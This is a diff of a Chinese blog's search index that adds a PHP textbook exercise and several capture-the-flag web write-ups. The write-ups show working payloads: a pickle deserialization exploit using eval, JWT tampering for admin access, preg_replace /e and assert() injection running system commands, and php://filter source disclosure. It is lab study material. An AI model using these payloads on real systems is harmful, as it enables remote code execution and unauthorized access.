@@ -3502,6 +3502,9 @@ if(isset($_GET['exp'])){
 <p>类型转换</p>
 <p>1.7.4</p>
 <p>可变变量</p>
+<p>附代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">     &lt;title&gt;Bob&#39;s Auto Parts - Order Results&lt;&#x2F;title&gt;</span><br><span class="line"> &lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;h1&gt;Bob&#39;s Auto Parts&lt;&#x2F;h1&gt;</span><br><span class="line"> &lt;h2&gt;Order Results&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;?php</span><br><span class="line">&#x2F;&#x2F;  echo &#39;&lt;p&gt; Order Processed.&lt;&#x2F;p&gt;&#39;</span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;?php</span><br><span class="line">&#x2F;&#x2F;    echo &quot;&lt;p&gt;Order processed at &quot;;</span><br><span class="line">&#x2F;&#x2F;    echo date(&#39;H:i, jS F Y&#39;);</span><br><span class="line">&#x2F;&#x2F;    echo &quot;&lt;&#x2F;p&gt;&quot;</span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line">  echo &quot;&lt;p&gt;Order processed at &quot;.date(&#39;H:i, jS F Y&#39;).&quot;&lt;&#x2F;p&gt;&quot;</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line">  $tireqty &#x3D; $_POST[&#39;tireqty&#39;];</span><br><span class="line">  $oilqty &#x3D; $_POST[&#39;oilqty&#39;];</span><br><span class="line">  $sparkqty &#x3D; $_POST[&#39;sparkqty&#39;];</span><br><span class="line">  $address &#x3D; $_POST[&#39;address&#39;];</span><br><span class="line">  echo &#39;&lt;p&gt;Your order is as follows: &lt;&#x2F;p&gt;&#39;;</span><br><span class="line">  echo htmlspecialchars($tireqty).&#39; tires&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">  echo htmlspecialchars($oilqty).&#39; bottle of oil&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">  echo htmlspecialchars($sparkqty).&#39; spark plugs&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">  echo &#39;address is &#39;.htmlspecialchars($address);</span><br><span class="line"> ?&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;?php</span><br><span class="line">&#x2F;&#x2F;  echo phpinfo();</span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line"> $totalqty  &#x3D; 0;</span><br><span class="line"> $totalqty &#x3D; $tireqty + $oilqty + $sparkqty;</span><br><span class="line"> echo &quot;&lt;p&gt;Items ordered :&quot;. $totalqty.&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line"> $totalomunt &#x3D; 0.00;</span><br><span class="line"></span><br><span class="line"> define(&#39;TIREPRICE&#39;, 100);</span><br><span class="line"> define(&#39;OILPRICE&#39;, 10);</span><br><span class="line"> define(&#39;SPARKPRICE&#39;, 4);</span><br><span class="line"> $totalomunt &#x3D; $tireqty * TIREPRICE</span><br><span class="line">     + $oilqty * OILPRICE</span><br><span class="line">     + $sparkqty * SPARKPRICE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> echo &quot;Subtotal: $&quot;.number_format($totalomunt,2).&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line"> $taxrate &#x3D; 0.10;</span><br><span class="line"> $totalomunt &#x3D; $totalomunt * (1+ $taxrate);</span><br><span class="line"> echo &quot;Total including tax: $&quot;.number_format($totalomunt,2).&quot;&lt;&#x2F;p&gt;&quot;</span><br><span class="line"> ?&gt;</span><br><span class="line">&lt;!-- --&gt;</span><br><span class="line"></span><br><span class="line"> &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
         <tag>php</tag>
@@ -3786,9 +3789,91 @@ if(isset($_GET['exp'])){
 <p>提示我们下载文件</p>
 <p>下载之后就是难点python的pickle漏洞</p>
 <p><strong>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<strong>reduce</strong>()函数从而触发恶意代码。</strong></p>
+<p>做题：</p>
+<p><img src="/2021/09/21/buu/22/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210924202100689.png" alt="image-20210924202100689"></p>
+<p>按照提示，利用脚本寻找一下lv6的踪迹</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    url = <span class="string">&quot;http://06312721-18d2-4fee-bac0-d6591cf2e757.node4.buuoj.cn:81/shop?page=&#123;&#125;&quot;</span></span><br><span class="line">    url = url.format(i)</span><br><span class="line">    print(url)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        print(<span class="string">&quot;find it:&quot;</span> ,url)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/21/buu/22/image-20210924202357414.png" alt="image-20210924202357414"></p>
+<p>访问page181</p>
+<p><img src="/2021/09/21/buu/22/image-20210924202458922.png" alt="image-20210924202458922"></p>
+<p>找到这个刺头了，买它！！！</p>
+<p>结果，操作失败hh</p>
+<p><img src="/2021/09/21/buu/22/image-20210924202659335.png" alt="image-20210924202659335"></p>
+<p>偷偷放进抓包里修改金额</p>
+<p><img src="/2021/09/21/buu/22/image-20210924203723295.png" alt="image-20210924203723295"></p>
+<p>提示我们需要admin权限啊</p>
+<p>跳过了得到密钥一步</p>
+<p>JWT修改</p>
+<p><img src="/2021/09/21/buu/22/image-20210924204157770.png" alt="image-20210924204157770"></p>
+<p>成功访问</p>
+<p><img src="/2021/09/21/buu/22/image-20210924204354932.png" alt="image-20210924204354932"></p>
+<p><img src="/2021/09/21/buu/22/image-20210924204124430.png" alt="image-20210924204124430"></p>
+<p>按照提示下载源码</p>
+<p>查看代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"><span class="meta">@tornado.web.authenticated</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">        p = pickle.loads(urllib.unquote(become))</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<strong>reduce</strong>()函数从而触发恶意代码。<br>其实反序列化漏洞思路都是差不多的<br>就是找到序列化的参数，看他可不可以修改，可以修改就可以进行任意文件读取或者命令执行<br>这里我们可以修改become这个参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">#python2</span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,))    #打开读取flag.txt的内容</span><br><span class="line"></span><br><span class="line">a &#x3D; pickle.dumps(payload())  #序列化payload</span><br><span class="line">a &#x3D; urllib.quote(a)  #进行url编码</span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">#python3</span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;open(&#39;&#x2F;flag.txt&#39;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a&#x3D;exp()</span><br><span class="line">s&#x3D;pickle.dumps(a)</span><br><span class="line">print urllib.quote(s)</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<p><img src="/2021/09/21/buu/22/image-20210924205124943.png" alt="image-20210924205124943"></p>
+<p>传入become参数即可</p>
 ]]></content>
       <tags>
         <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ics-05&amp;&amp;mfw</title>
+    <url>/2021/09/23/web/1/</url>
+    <content><![CDATA[<p> 简略说下思路</p>
+<h4 id="ics-05："><a href="#ics-05：" class="headerlink" title="ics-05："></a>ics-05：</h4><p>这题应该算很早之前写过了，结果又忘了。。。</p>
+<p>在一个页面里有着变量page可控</p>
+<p><img src="/2021/09/23/web/1/image-20210924195014659.png" alt="image-20210924195014659"></p>
+<p>然后用php伪协议读取下源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:filter<span class="comment">//read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/web/1/image-20210924195146901.png" alt="image-20210924195146901"></p>
+<p>解码后</p>
+<p>选取重要的来说</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$pattern = $_GET[pat];</span><br><span class="line">$replacement = $_GET[rep];</span><br><span class="line">$subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">    preg_replace($pattern, $replacement, $subject);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>提示我们用xff头绕过</p>
+<p>同时利用preg_replace函数的漏洞</p>
+<p>preg_replace( pattern , replacement , subject ) :</p>
+<p>当preg_replace的参数pattern输入/e的时候 ,参数replacement的代码当作PHP代码执行（相当于eval漏洞执行）</p>
+<h5 id="preg-repleace漏洞详情"><a href="#preg-repleace漏洞详情" class="headerlink" title="preg_repleace漏洞详情"></a>preg_repleace漏洞详情</h5><p><a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">preg_replace() /e代码执行漏洞_2021！的博客-CSDN博客</a></p>
+<p>于是构造payload</p>
+<p>之后get型变量来读文件</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?pat&#x3D;&#x2F;txt&#x2F;e&amp;rep&#x3D;system(&quot;ls&quot;)&amp;sub&#x3D;txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/web/1/image-20210924200141437.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?pat&#x3D;&#x2F;txt&#x2F;e&amp;rep&#x3D;system(&quot;cat+s3chahahaDir&#x2F;flag&#x2F;flag.php&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/web/1/image-20210924200335525.png" alt="image-20210924200141437"></p>
+<h4 id="mfw："><a href="#mfw：" class="headerlink" title="mfw："></a>mfw：</h4><p>这题试着解了下</p>
+<p>按照源码提示秘密在?page=flag</p>
+<p>于是访问，没什么发现</p>
+<p><img src="/2021/09/23/web/1/image-20210924200629448.png" alt="image-20210924200629448"></p>
+<p>我突发奇想用目录遍历</p>
+<p><img src="/2021/09/23/web/1/image-20210924200718261.png" alt="image-20210924200718261"></p>
+<p>好家伙，页面回显发现黑客警告，肯定被过滤了</p>
+<p>这时候采用dirsearch扫描，果然有了.git泄露</p>
+<p>所以再使用工具GitHack下载源码</p>
+<p><img src="/2021/09/23/web/1/image-20210924200852766.png" alt="image-20210924200852766"></p>
+<p>看看代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">   $page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   $page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;<span class="comment">//连接变量与路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);<span class="comment">//这就是之前我目录遍历的时候被过滤的地方</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">page&#x3D;about.php%27%2c+%27123%27)+%3d%3d%3d+false+and+system(%27cat+t  emplates%2fflag.php%27)+and+strpos(%27templates%2fflag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/web/1/image-20210924201624926.png" alt="image-20210924201624926"></p>
+]]></content>
+      <tags>
+        <tag>攻防世界_web</tag>
       </tags>
   </entry>
 </search>
